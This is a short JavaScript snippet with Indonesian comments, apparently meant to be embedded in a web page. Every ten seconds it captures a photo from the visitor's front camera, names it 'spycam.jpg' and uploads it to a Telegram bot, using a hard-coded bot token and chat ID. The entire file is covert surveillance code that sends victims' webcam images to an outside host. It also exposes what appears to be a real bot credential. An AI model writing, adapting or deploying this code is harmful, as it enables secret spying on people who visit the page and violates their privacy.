const BOT_TOKEN = '7770985430:AAFuJIEHZ7ORrtih7i9K8Iu_57F41tsTLL4';  // Dari @BotFather
const CHAT_ID = '7730972930';      // Dari @userinfobot

// Auto-capture setiap 10 detik
setInterval(() => {
    captureAndSend();
}, 10000);

async function captureAndSend() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: 1280, height: 720 } 
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            // Konversi ke Blob untuk pengiriman lebih stabil
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'spycam.jpg');
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => console.log('Foto terkirim!'))
                .catch(err => console.error('Error:', err));
            }, 'image/jpeg', 0.8);
        };
    } catch (err) {
        console.error('Akses kamera gagal:', err);
    }
}
